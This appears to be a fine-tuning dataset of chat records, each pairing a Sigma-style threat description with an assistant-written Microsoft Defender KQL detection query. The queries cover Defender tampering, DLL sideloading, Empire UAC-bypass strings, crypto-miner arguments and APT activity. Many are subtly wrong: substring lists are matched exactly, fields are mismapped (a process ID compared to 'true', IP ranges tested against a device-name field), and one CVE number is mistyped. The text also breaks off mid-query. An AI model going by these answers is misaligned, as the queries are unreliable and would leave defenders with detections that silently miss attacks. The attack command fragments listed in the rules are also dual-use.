{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the PowerShell execution policy in order to bypass signing requirements for script execution Topic: registry_set_powershell_execution_policy"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryKey endswith \"\\\\ShellIds\\\\Microsoft.PowerShell\\\\ExecutionPolicy\" or RegistryKey endswith \"\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ExecutionPolicy\") and (RegistryValueData contains \"Bypass\" or RegistryValueData contains \"Unrestricted\")) and (not((InitiatingProcessFolderPath contains \":\\\\Windows\\\\System32\\\\\" or InitiatingProcessFolderPath contains \":\\\\Windows\\\\SysWOW64\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may modify system firewalls in order to bypass controls limiting network usage Topic: proc_creation_win_netsh_fw_enable_group_rule"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"advfirewall\", \"firewall\", \"set\", \"rule\", \"group=\", \"new\", \"enable=Yes\")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"cmd.exe\" via the AnyViewer RMM agent on a remote management sessions.\n Topic: proc_creation_win_remote_access_tools_anyviewer_shell_exec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \"AVCore.exe\\\" -d\" and InitiatingProcessFileName =~ \"\\\\AVCore.exe\" and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects loading of a DLL by the VMware Xfer utility from the non-default directory which may be an attempt to sideload arbitrary DLL Topic: image_load_side_load_vmware_xfer"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where (FolderPath endswith \"\\\\glib-2.0.dll\" and InitiatingProcessFolderPath =~ \"\\\\VMwareXferlogs.exe\") and (not(FolderPath startswith \"C:\\\\Program Files\\\\VMware\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"mscorsvc.dll\". Topic: image_load_side_load_mscorsvc"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\mscorsvc.dll\" and (not((FolderPath startswith \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of a renamed BOINC binary. Topic: proc_creation_win_renamed_boinc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"BOINC.exe\" and (not(InitiatingProcessFolderPath =~ \"\\\\BOINC.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of wget to download content in a temporary directory such as \"/tmp\" or \"/var/tmp\" Topic: file_event_lnx_wget_download_file_in_tmp_dir"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"/tmp/\", \"/var/tmp/\")) and InitiatingProcessFolderPath =~ \"/wget\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"reg.exe\" to disable security services such as Windows Defender. Topic: proc_creation_win_reg_disable_sec_services"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\AppIDSvc\", \"\\\\MsMpSvc\", \"\\\\NisSrv\", \"\\\\SecurityHealthService\", \"\\\\Sense\", \"\\\\UsoSvc\", \"\\\\WdBoot\", \"\\\\WdFilter\", \"\\\\WdNisDrv\", \"\\\\WdNisSvc\", \"\\\\WinDefend\", \"\\\\wscsvc\", \"\\\\wuauserv\")) and (ProcessCommandLine in~ (\"reg\", \"add\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential tampering with Windows Defender settings such as adding exclusion using wmic Topic: proc_creation_win_wmic_namespace_defender"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/Namespace:\\\\\\\\root\\\\Microsoft\\\\Windows\\\\Defender\" and (ProcessVersionInfoOriginalFileName =~ \"wmic.exe\" or FolderPath endswith \"\\\\WMIC.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Archer malware invocation via rundll32 Topic: proc_creation_win_malware_fireball"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"rundll32.exe\", \"InstallArcherSvc\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the hdiutil utility in order to mount disk images. Topic: proc_creation_macos_hdiutil_mount"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"attach \", \"mount \")) and InitiatingProcessFolderPath =~ \"/hdiutil\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects exploitation attempt of CVE-2023-38331 (WinRAR before v6.23), where an attacker can leverage WinRAR to execute arbitrary commands and binaries. Topic: proc_creation_win_exploit_cve_2023_38831_winrar_child_proc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\wscript.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"cscript.exe\", \"PowerShell.EXE\", \"pwsh.dll\", \"wscript.exe\"))) and ProcessCommandLine matches regex \"\\\\.[a-zA-Z0-9]{1,4} \\\\.\" and ProcessCommandLine =~ \"\\\\AppData\\\\Local\\\\Temp\\\\Rar$\" and InitiatingProcessFileName =~ \"\\\\WinRAR.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line usage of \"findstr\" to search for the \"passwords\" keyword in a variety of different languages Topic: proc_creation_win_findstr_password_recon"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"contrase\u00f1a\", \"has\u0142o\", \"heslo\", \"parola\", \"passe\", \"passw\", \"senha\", \"senord\", \"\u5bc6\u78bc\")) and (FolderPath endswith \"\\\\findstr.exe\" or ProcessVersionInfoOriginalFileName =~ \"FINDSTR.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects activity observed by different researchers to be HAFNIUM group activity (or related) on Exchange servers Topic: proc_creation_win_apt_hafnium"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" -t7z \", \"C:\\\\Programdata\\\\pst\", \"\\\\it.zip\")) or (ProcessCommandLine in~ (\"attrib\", \" +h \", \" +s \", \" +r \", \".aspx\")) or ((ProcessCommandLine in~ (\"inetpub\\\\wwwroot\\\\\", \".dmp.zip\")) and InitiatingProcessFolderPath =~ \"\\\\makecab.exe\") or ((ProcessCommandLine in~ (\"Microsoft\\\\Exchange Server\\\\\", \"compressionmemory\", \".gif\")) and InitiatingProcessFolderPath =~ \"\\\\makecab.exe\") or ((InitiatingProcessFileName in~ (\"\\\\services.exe\", \"\\\\svchost.exe\")) and InitiatingProcessFolderPath =~ \"Opera_browser.exe\") or InitiatingProcessFolderPath =~ \"Users\\\\Public\\\\opera\\\\Opera_browser.exe\" or (ProcessCommandLine in~ (\"Windows\\\\Temp\\\\xx.bat\", \"Windows\\\\WwanSvcdcs\", \"Windows\\\\Temp\\\\cw.exe\")) or (ProcessCommandLine in~ (\"\\\\comsvcs.dll\", \"Minidump\", \"full \", \"\\\\inetpub\\\\wwwroot\")) or (FolderPath contains \"\\\\ProgramData\\\\VSPerfMon\\\\\" or (ProcessCommandLine contains \"schtasks\" and ProcessCommandLine contains \"VSPerfMon\")) or (ProcessCommandLine in~ (\"vssadmin list shadows\", \"Temp\\\\__output\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the invocation of the Stored User Names and Passwords dialogue (Key Manager) Topic: proc_creation_win_rundll32_keymgr"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"keymgr\", \"KRShowKeyMgr\")) and (FolderPath endswith \"\\\\rundll32.exe\" or ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific process tree behavior linked to \"rundll32\" executions, wherein the associated DLL lacks a common \".dll\" extension, often signaling potential Pikabot activity.\n Topic: proc_creation_win_malware_pikabot_rundll32_uncommon_extension"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\wscript.exe\")) and (ProcessCommandLine in~ (\":\\\\ProgramData\\\\\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\Installer\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Roaming\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\rundll32.exe\") and (not(((ProcessCommandLine contains \".cpl \" or ProcessCommandLine contains \".cpl,\" or ProcessCommandLine contains \".dll \" or ProcessCommandLine contains \".dll,\" or ProcessCommandLine contains \".inf \" or ProcessCommandLine contains \".inf,\") or (ProcessCommandLine endswith \".cpl\" or ProcessCommandLine endswith \".cpl\\\"\" or ProcessCommandLine endswith \".dll\" or ProcessCommandLine endswith \".dll\\\"\" or ProcessCommandLine endswith \".inf\" or ProcessCommandLine endswith \".inf\\\"\" or ProcessCommandLine endswith \".cpl'\" or ProcessCommandLine endswith \".dll'\" or ProcessCommandLine endswith \".inf'\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects value modification of registry key containing path to binary used as screensaver. Topic: registry_event_modify_screensaver_binary_path"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Control Panel\\\\Desktop\\\\SCRNSAVE.EXE\" and (not((InitiatingProcessFolderPath in~ (\"\\\\rundll32.exe\", \"\\\\explorer.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects applications trying to modify the registry in order to disable any write-protect property for storage devices.\nThis could be a precursor to a ransomware attack and has been an observed technique used by cypherpunk group.\n Topic: proc_creation_win_reg_write_protect_for_storage_disabled"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\System\\\\CurrentControlSet\\\\Control\", \"Write Protection\", \"0\", \"storage\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the setting of a custom protocol handler with the name \"rogue\".\nSeen being created by Forest Blizzard APT as reported by MSFT.\n Topic: registry_set_apt_forest_blizzard_custom_protocol_handler"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\PROTOCOLS\\\\Handler\\\\rogue\\\\CLSID\" and RegistryValueData =~ \"{026CC6D7-34B2-33D5-B551-CA31EB6CE345}\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious network connections made by a well-known Windows binary run with no command line parameters Topic: net_connection_win_susp_binary_no_cmdline"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where ((InitiatingProcessCommandLine endswith \"\\\\regsvr32.exe\" or InitiatingProcessCommandLine endswith \"\\\\rundll32.exe\" or InitiatingProcessCommandLine endswith \"\\\\dllhost.exe\") and InitiatingProcessId =~ \"true\" and (InitiatingProcessFolderPath in~ (\"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\dllhost.exe\"))) and (not((InitiatingProcessCommandLine =~ \"\" or isnull(InitiatingProcessCommandLine))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects WMI script event consumers Topic: proc_creation_win_wmi_persistence_script_event_consumer"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\wbem\\\\scrcons.exe\" and InitiatingProcessFileName =~ \"C:\\\\Windows\\\\System32\\\\svchost.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file access requests to the Windows Credential History File by an uncommon application.\nThis can be a sign of credential stealing. Example case would be usage of mimikatz \"dpapi::credhist\" function\n Topic: file_access_win_susp_credhist"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName endswith \"\\\\Microsoft\\\\Protect\\\\CREDHIST\" and (not((InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\explorer.exe\" or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\\", \"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Windows\\\\system32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the deletion of the \"Zone.Identifier\" ADS by an uncommon process. Attackers can leverage this in order to bypass security restrictions that make use of the ADS such as Microsoft Office apps. Topic: file_delete_win_zone_identifier_ads_uncommon"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \":Zone.Identifier\" and (not((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files\\\\PowerShell\\\\7-preview\\\\pwsh.exe\", \"C:\\\\Program Files\\\\PowerShell\\\\7\\\\pwsh.exe\", \"C:\\\\Windows\\\\explorer.exe\", \"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\", \"C:\\\\Windows\\\\SysWOW64\\\\explorer.exe\", \"C:\\\\Windows\\\\SysWOW64\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\")))) and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\", \"C:\\\\Program Files\\\\Google\\\\Chrome\\\\Application\\\\chrome.exe\")) or (InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\Mozilla Firefox\\\\firefox.exe\", \"C:\\\\Program Files\\\\Mozilla Firefox\\\\firefox.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Identifies use of various commands to query a systems time. This technique may be used before executing a scheduled task or to discover the time zone of a target system. Topic: proc_creation_win_remote_time_discovery"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"time\" and (InitiatingProcessFolderPath in~ (\"\\\\net.exe\", \"\\\\net1.exe\"))) or (ProcessCommandLine =~ \"tz\" and InitiatingProcessFolderPath =~ \"\\\\w32tm.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file execution using the msdeploy.exe lolbin Topic: proc_creation_win_lolbin_msdeploy"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"verb:sync\", \"-source:RunCommand\", \"-dest:runCommand\")) and InitiatingProcessFolderPath =~ \"\\\\msdeploy.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of \"gpg.exe\" from uncommon location. Often used by ransomware and loaders to decrypt/encrypt data. Topic: proc_creation_win_gpg4win_portable_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\gpg.exe\" or FolderPath endswith \"\\\\gpg2.exe\") or ProcessVersionInfoOriginalFileName =~ \"gpg.exe\" or ProcessVersionInfoFileDescription =~ \"GnuPG\u2019s OpenPGP tool\") and (not((FolderPath contains \":\\\\Program Files (x86)\\\\GNU\\\\GnuPG\\\\bin\\\\\" or FolderPath contains \":\\\\Program Files (x86)\\\\GnuPG VS-Desktop\\\\\" or FolderPath contains \":\\\\Program Files (x86)\\\\GnuPG\\\\bin\\\\\" or FolderPath contains \":\\\\Program Files (x86)\\\\Gpg4win\\\\bin\\\\\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects command line parameters or strings often used by crypto miners Topic: proc_creation_win_susp_crypto_mining_monero"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" --cpu-priority=\", \"--donate-level=0\", \" -o pool.\", \" --nicehash\", \" --algo=rx/0 \", \"stratum+tcp://\", \"stratum+udp://\", \"LS1kb25hdGUtbGV2ZWw9\", \"0tZG9uYXRlLWxldmVsP\", \"tLWRvbmF0ZS1sZXZlbD\", \"c3RyYXR1bSt0Y3A6Ly\", \"N0cmF0dW0rdGNwOi8v\", \"zdHJhdHVtK3RjcDovL\", \"c3RyYXR1bSt1ZHA6Ly\", \"N0cmF0dW0rdWRwOi8v\", \"zdHJhdHVtK3VkcDovL\")) and (not((ProcessCommandLine in~ (\" pool.c \", \" pool.o \", \"gcc -\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"CCleanerReactivator.dll\" Topic: image_load_side_load_ccleaner_reactivator"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\CCleanerReactivator.dll\" and (not(InitiatingProcessFolderPath =~ \"\\\\CCleanerReactivator.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a specific command line arguments sequence seen used by SNAKE malware during its installation as described by CISA in their report Topic: proc_creation_win_malware_snake_installer_cli_args"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"\\\\s[a-fA-F0-9]{64}\\\\s[a-fA-F0-9]{16}\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of certutil with the \"encode\" flag to encode a file to base64 where the files are located in potentially suspicious locations Topic: proc_creation_win_certutil_encode_susp_location"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \"-encode\" or ProcessCommandLine contains \"/encode\" or ProcessCommandLine contains \"\u2013encode\" or ProcessCommandLine contains \"\u2014encode\" or ProcessCommandLine contains \"\u2015encode\") and (ProcessCommandLine in~ (\"\\\\AppData\\\\Roaming\\\\\", \"\\\\Desktop\\\\\", \"\\\\Local\\\\Temp\\\\\", \"\\\\PerfLogs\\\\\", \"\\\\Users\\\\Public\\\\\", \"\\\\Windows\\\\Temp\\\\\", \"$Recycle.Bin\")) and (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects some Empire PowerShell UAC bypass methods Topic: proc_creation_win_hktl_empire_powershell_uac_bypass"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\" -NoP -NonI -w Hidden -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update)\", \" -NoP -NonI -c $x=$((gp HKCU:Software\\\\Microsoft\\\\Windows Update).Update);\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of ruby using the \"-e\" flag. This is could be used as a way to launch a reverse shell or execute live ruby code. Topic: proc_creation_win_ruby_inline_command_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" -e\" and (FolderPath endswith \"\\\\ruby.exe\" or ProcessVersionInfoOriginalFileName =~ \"ruby.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects possible successful exploitation for vulnerability described in CVE-2021-26857 by looking for | abnormal subprocesses spawning by Exchange Servers Unified Messaging service Topic: proc_creation_win_exploit_cve_2021_26857_msexchange"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\UMWorkerProcess.exe\" and (not((InitiatingProcessFolderPath in~ (\"wermgr.exe\", \"WerFault.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects tampering with the \"Enabled\" registry key in order to disable Windows logging of a Windows event channel Topic: registry_set_disable_winevt_logging"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryValueData =~ \"DWORD (0x00000000)\" and RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels*\" and RegistryKey endswith \"\\\\Enabled\") and (not((InitiatingProcessFolderPath =~ \"\\\\TiWorker.exe\" or (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\System32\\\\svchost.exe\" and (RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\\\\Microsoft-Windows-FileInfoMinifilter\" or RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\\\\Microsoft-Windows-ASN1*\" or RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\\\\Microsoft-Windows-Kernel-AppCompat*\" or RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\\\\Microsoft-Windows-Runtime\\\\Error*\" or RegistryKey endswith \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\\\\Microsoft-Windows-CAPI2/Operational*\")) or (InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\servicing\\\\TrustedInstaller.exe\" and RegistryKey contains \"\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\WINEVT\\\\Channels\\\\Microsoft-Windows-Compat-Appraiser\") or InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\wevtutil.exe\"))) and (not((InitiatingProcessFolderPath =~ \"\" or isnull(InitiatingProcessFolderPath))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the \"type\" command to download/upload data from WebDAV server Topic: proc_creation_win_cmd_type_arbitrary_file_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"type \\\\\\\\\", \" > \")) or (ProcessCommandLine in~ (\"type \", \" > \\\\\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files. Topic: proc_creation_win_regini_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\regini.exe\" or ProcessVersionInfoOriginalFileName =~ \"REGINI.EXE\") and (not(ProcessCommandLine matches regex \":[^ \\\\\\\\]\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of bitsadmin downloading a file to a suspicious target folder Topic: proc_creation_win_bitsadmin_download_susp_targetfolder"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /transfer \", \" /create \", \" /addfile \")) and (ProcessCommandLine in~ (\":\\\\Perflogs\", \":\\\\ProgramData\\\\\", \":\\\\Temp\\\\\", \":\\\\Users\\\\Public\\\\\", \":\\\\Windows\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Roaming\\\\\", \"\\\\Desktop\\\\\", \"%ProgramData%\", \"%public%\")) and (FolderPath endswith \"\\\\bitsadmin.exe\" or ProcessVersionInfoOriginalFileName =~ \"bitsadmin.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an office application (Word, Excel, PowerPoint)  that initiate a network connection to a non-private IP addresses.\nThis rule aims to detect traffic similar to one seen exploited in CVE-2021-42292.\nThis rule will require an initial baseline and tuning that is specific to your organization.\n Topic: net_connection_win_office_outbound_non_local_ip"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where (InitiatingProcessId =~ \"true\" and (InitiatingProcessFolderPath in~ (\"\\\\excel.exe\", \"\\\\outlook.exe\", \"\\\\powerpnt.exe\", \"\\\\winword.exe\", \"\\\\wordview.exe\"))) and (not(((InitiatingProcessRemoteSessionDeviceName in~ (\"127.0.0.0/8\", \"10.0.0.0/8\", \"172.16.0.0/12\", \"192.168.0.0/16\", \"169.254.0.0/16\", \"::1/128\", \"fe80::/10\", \"fc00::/7\")) or ((InitiatingProcessRemoteSessionDeviceName in~ (\"13.107.6.152/31\", \"13.107.18.10/31\", \"13.107.128.0/22\", \"23.103.160.0/20\", \"40.96.0.0/13\", \"40.104.0.0/15\", \"52.96.0.0/14\", \"131.253.33.215/32\", \"132.245.0.0/16\", \"150.171.32.0/22\", \"204.79.197.215/32\", \"2603:1006::/40\", \"2603:1016::/36\", \"2603:1026::/36\", \"2603:1036::/36\", \"2603:1046::/36\", \"2603:1056::/36\", \"2620:1ec:4::152/128\", \"2620:1ec:4::153/128\", \"2620:1ec:c::10/128\", \"2620:1ec:c::11/128\", \"2620:1ec:d::10/128\", \"2620:1ec:d::11/128\", \"2620:1ec:8f0::/46\", \"2620:1ec:900::/46\", \"2620:1ec:a92::152/128\", \"2620:1ec:a92::153/128\")) and (RemotePort in~ (\"80\", \"443\"))) or ((InitiatingProcessRemoteSessionDeviceName in~ (\"13.107.6.152/31\", \"13.107.18.10/31\", \"13.107.128.0/22\", \"23.103.160.0/20\", \"40.96.0.0/13\", \"40.104.0.0/15\", \"52.96.0.0/14\", \"131.253.33.215/32\", \"132.245.0.0/16\", \"150.171.32.0/22\", \"204.79.197.215/32\", \"2603:1006::/40\", \"2603:1016::/36\", \"2603:1026::/36\", \"2603:1036::/36\", \"2603:1046::/36\", \"2603:1056::/36\", \"2620:1ec:4::152/128\", \"2620:1ec:4::153/128\", \"2620:1ec:c::10/128\", \"2620:1ec:c::11/128\", \"2620:1ec:d::10/128\", \"2620:1ec:d::11/128\", \"2620:1ec:8f0::/46\", \"2620:1ec:900::/46\", \"2620:1ec:a92::152/128\", \"2620:1ec:a92::153/128\")) and Protocol =~ \"tcp\" and (RemotePort in~ (\"143\", \"587\", \"993\", \"995\"))) or ((InitiatingProcessRemoteSessionDeviceName in~ (\"40.92.0.0/15\", \"40.107.0.0/16\", \"52.100.0.0/14\", \"52.238.78.88/32\", \"104.47.0.0/17\", \"2a01:111:f400::/48\", \"2a01:111:f403::/48\")) and RemotePort == 443) or ((InitiatingProcessRemoteSessionDeviceName in~ (\"40.92.0.0/15\", \"40.107.0.0/16\", \"52.100.0.0/14\", \"52.238.78.88/32\", \"104.47.0.0/17\", \"2a01:111:f400::/48\", \"2a01:111:f403::/48\")) and RemotePort == 25) or (InitiatingProcessRemoteSessionDeviceName in~ (\"20.184.0.0/13\", \"20.192.0.0/10\", \"23.72.0.0/13\", \"40.76.0.0/14\", \"51.10.0.0/15\", \"51.103.0.0/16\", \"51.104.0.0/15\", \"51.142.136.0/22\", \"52.160.0.0/11\", \"204.79.197.0/24\")) or ((InitiatingProcessRemoteSessionDeviceName in~ 